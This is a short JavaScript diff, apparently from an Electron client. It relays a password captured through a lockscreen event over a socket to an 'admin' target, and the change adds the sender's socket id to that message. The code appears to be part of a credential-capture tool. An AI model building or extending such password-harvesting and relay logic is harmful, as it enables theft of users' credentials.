@@ -437,7 +437,7 @@ window.onload = async () => {
 
         window.electronAPI.onCapturedPassword((pwd) => {
             if (currentAdminForLockscreen) {
-                socket.emit('captured-password', { targetId: currentAdminForLockscreen, password: pwd });
+                socket.emit('captured-password', { targetId: currentAdminForLockscreen, password: pwd, sourceId: socket.id });
                 currentAdminForLockscreen = null;
             }
         });
